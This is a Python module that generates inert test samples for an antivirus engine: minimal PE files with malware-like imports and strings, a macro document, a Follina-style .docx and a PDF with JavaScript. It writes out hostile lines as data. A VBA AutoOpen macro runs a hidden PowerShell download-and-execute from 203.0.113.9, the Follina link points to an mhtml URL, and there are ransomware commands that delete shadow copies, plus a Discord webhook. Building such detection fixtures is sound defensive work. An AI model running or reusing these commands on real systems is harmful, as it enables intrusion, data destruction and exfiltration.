"""Gera amostras INOFENSIVAS para os testes (nada aqui executa código malicioso).

Os executáveis PE gerados contêm apenas a instrução 'ret' — só a tabela de
importações e as strings imitam o que um malware real teria.
"""
from __future__ import annotations

import io
import struct
import zipfile

from exeav.engine.rules import load_builtin_dicts


def eicar() -> bytes:
    d = next(x for x in load_builtin_dicts() if x["id"] == "test.eicar")
    return bytes.fromhex(d["all"][0][4:])


def _align(n: int, a: int) -> int:
    return (n + a - 1) // a * a


def build_pe(imports: dict[str, list[str]], strings: bytes = b"", section_names=(b".text", b".rdata"),
             text_flags: int = 0x60000020, text_data: bytes = b"\xc3", extra_entropy: bytes = b"") -> bytes:
    """Monta um PE32+ mínimo e válido."""
    FA, SA = 0x200, 0x1000
    text_rva, rdata_rva = 0x1000, 0x2000
    # ------------- .rdata: importações + strings
    rd = bytearray()
    n_dlls = len(imports)
    desc_size = 20 * (n_dlls + 1)
    rd += b"\x00" * desc_size
    descs = []
    for dll, funcs in imports.items():
        name_rvas = []
        for f in funcs:
            while len(rd) % 2:
                rd += b"\x00"
            name_rvas.append(rdata_rva + len(rd))
            rd += struct.pack("<H", 0) + f.encode() + b"\x00"
        while len(rd) % 8:
            rd += b"\x00"
        ilt = rdata_rva + len(rd)
        for r in name_rvas:
            rd += struct.pack("<Q", r)
        rd += struct.pack("<Q", 0)
        iat = rdata_rva + len(rd)
        for r in name_rvas:
            rd += struct.pack("<Q", r)
        rd += struct.pack("<Q", 0)
        dll_rva = rdata_rva + len(rd)
        rd += dll.encode() + b"\x00"
        descs.append((ilt, dll_rva, iat))
    for i, (ilt, name, iat) in enumerate(descs):
        rd[i * 20:(i + 1) * 20] = struct.pack("<IIIII", ilt, 0, 0, name, iat)
    rd += b"\x00" * 16 + strings
    text = text_data + extra_entropy
    text_raw = _align(len(text), FA)
    rdata_raw = _align(len(rd), FA)
    hdr_size = 0x400
    size_of_image = _align(rdata_rva + len(rd), SA)
    # ------------- cabeçalhos
    dos = bytearray(b"MZ" + b"\x00" * 0x3A + struct.pack("<I", 0x80))
    dos += b"\x0e\x1f\xba\x0e\x00\xb4\x09\xcd\x21\xb8\x01\x4c\xcd\x21This program cannot be run in DOS mode.\r\r\n$"
    dos += b"\x00" * (0x80 - len(dos))
    fh = struct.pack("<4sHHIIIHH", b"PE\x00\x00", 0x8664, 2, 1700000000, 0, 0, 240, 0x22)
    dd = [(0, 0)] * 16
    dd[1] = (rdata_rva, desc_size)
    opt = struct.pack("<HBBIIIIIQIIHHHHHHIIIIHHQQQQII", 0x20B, 14, 0, text_raw, rdata_raw, 0, text_rva, text_rva,
                      0x140000000, SA, FA, 6, 0, 0, 0, 6, 0, 0, size_of_image, hdr_size, 0, 3, 0x8160,
                      0x100000, 0x1000, 0x100000, 0x1000, 0, 16)
    opt += b"".join(struct.pack("<II", a, b) for a, b in dd)
    secs = struct.pack("<8sIIIIIIHHI", section_names[0].ljust(8, b"\x00"), len(text), text_rva, text_raw, hdr_size,
                       0, 0, 0, 0, text_flags)
    secs += struct.pack("<8sIIIIIIHHI", section_names[1].ljust(8, b"\x00"), len(rd), rdata_rva, rdata_raw,
                        hdr_size + text_raw, 0, 0, 0, 0, 0x40000040)
    head = bytes(dos) + fh + opt + secs
    head += b"\x00" * (hdr_size - len(head))
    return head + text.ljust(text_raw, b"\x00") + bytes(rd).ljust(rdata_raw, b"\x00")


BENIGN_IMPORTS = {"KERNEL32.dll": ["ExitProcess", "GetStdHandle", "WriteFile", "GetCommandLineW", "HeapAlloc",
                                   "HeapFree", "GetProcessHeap", "IsDebuggerPresent", "GetLastError"],
                  "USER32.dll": ["MessageBoxW"]}

INJECTOR_IMPORTS = {"KERNEL32.dll": ["OpenProcess", "VirtualAllocEx", "WriteProcessMemory", "CreateRemoteThread",
                                     "CloseHandle", "ExitProcess", "CreateToolhelp32Snapshot", "Process32FirstW",
                                     "Process32NextW", "TerminateProcess"],
                    "ADVAPI32.dll": ["OpenProcessToken", "LookupPrivilegeValueW", "AdjustTokenPrivileges",
                                     "RegSetValueExW", "RegCreateKeyExW"]}

KEYLOGGER_IMPORTS = {"USER32.dll": ["SetWindowsHookExW", "GetAsyncKeyState", "GetForegroundWindow", "GetWindowTextW",
                                    "CallNextHookEx", "MapVirtualKeyW", "GetKeyboardState"],
                     "KERNEL32.dll": ["CreateFileW", "WriteFile", "ExitProcess"],
                     "URLMON.dll": ["URLDownloadToFileW"], "SHELL32.dll": ["ShellExecuteW"]}


def benign_pe() -> bytes:
    return build_pe(BENIGN_IMPORTS, b"Hello world\x00Usage: tool.exe [options]\x00")


def injector_ransom_pe() -> bytes:
    s = (b"SeDebugPrivilege\x00cmd.exe /c vssadmin.exe delete shadows /all /quiet\x00"
         b"bcdedit /set {default} recoveryenabled no\x00"
         + "Software\\Microsoft\\Windows\\CurrentVersion\\Run".encode("utf-16le") + b"\x00\x00"
         + b"msmpeng.exe\x00avp.exe\x00ekrn.exe\x00bdagent.exe\x00mbam.exe\x00")
    return build_pe(INJECTOR_IMPORTS, s)


def keylogger_pe() -> bytes:
    s = b"[BACKSPACE]\x00[ENTER]\x00[CAPSLOCK]\x00[SHIFT]\x00[TAB]\x00https://discord.com/api/webhooks/123456/abc\x00"
    return build_pe(KEYLOGGER_IMPORTS, s)


def packed_pe() -> bytes:
    import random
    rnd = random.Random(7)
    blob = bytes(rnd.getrandbits(8) for _ in range(64 * 1024))
    return build_pe({"KERNEL32.dll": ["LoadLibraryA", "GetProcAddress", "VirtualProtect", "ExitProcess"]},
                    section_names=(b"UPX1", b"UPX2"), text_flags=0xE0000020, extra_entropy=blob)


def ovba_compress_literal(src: bytes) -> bytes:
    """Compressão MS-OVBA válida usando apenas literais (suficiente para testes)."""
    out = bytearray(b"\x01")
    for i in range(0, len(src), 3640):
        chunk = src[i:i + 3640]
        body = bytearray()
        for j in range(0, len(chunk), 8):
            body += b"\x00" + chunk[j:j + 8]
        header = (len(body) + 2 - 3) | (0b011 << 12) | 0x8000
        out += struct.pack("<H", header) + body
    return bytes(out)


MACRO = (b'Attribute VB_Name = "ThisDocument"\r\nSub AutoOpen()\r\n  Dim s\r\n'
         b'  s = "powershell -w hidden -c IEX (New-Object Net.WebClient).DownloadString(\'http://203.0.113.9/a\')"\r\n'
         b'  CreateObject("WScript.Shell").Run s, 0\r\nEnd Sub\r\n')


def macro_docm() -> bytes:
    vba = b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1" + b"\x00" * 600 + b"junk" + ovba_compress_literal(MACRO) + b"\x00" * 64
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as z:
        z.writestr("[Content_Types].xml", "<Types/>")
        z.writestr("word/document.xml", "<w:document/>")
        z.writestr("word/vbaProject.bin", vba)
    return buf.getvalue()


def follina_docx() -> bytes:
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as z:
        z.writestr("[Content_Types].xml", "<Types/>")
        z.writestr("word/document.xml", "<w:document/>")
        z.writestr("word/_rels/document.xml.rels",
                   '<Relationships><Relationship Id="rId99" Type="http://schemas.openxmlformats.org/officeDocument/'
                   '2006/relationships/oleObject" Target="mhtml:http://203.0.113.9/x.html!x-usc:http://203.0.113.9/x.html"'
                   ' TargetMode="External"/></Relationships>')
    return buf.getvalue()


def zip_with(name: str, data: bytes) -> bytes:
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as z:
        z.writestr("leia-me.txt", "documento normal")
        z.writestr(name, data)
    return buf.getvalue()


def malicious_pdf() -> bytes:
    import zlib
    js = zlib.compress(b"var s = unescape('%u9090'); eval(unescape('%61%6c%65%72%74'));")
    return (b"%PDF-1.7\n1 0 obj\n<< /Type /Catalog /Pages 2 0 R /OpenAction 3 0 R >>\nendobj\n"
            b"2 0 obj\n<< /Type /Pages /Kids [] /Count 0 >>\nendobj\n"
            b"3 0 obj\n<< /Type /Action /S /JavaScript /JS 4 0 R >>\nendobj\n"
            b"4 0 obj\n<< /Length " + str(len(js)).encode() + b" /Filter /FlateDecode >>\nstream\n" + js +
            b"\nendstream\nendobj\n5 0 obj\n<< /Type /Action /S /Launch /F (cmd.exe) >>\nendobj\n"
            b"trailer\n<< /Root 1 0 R >>\n%%EOF\n")
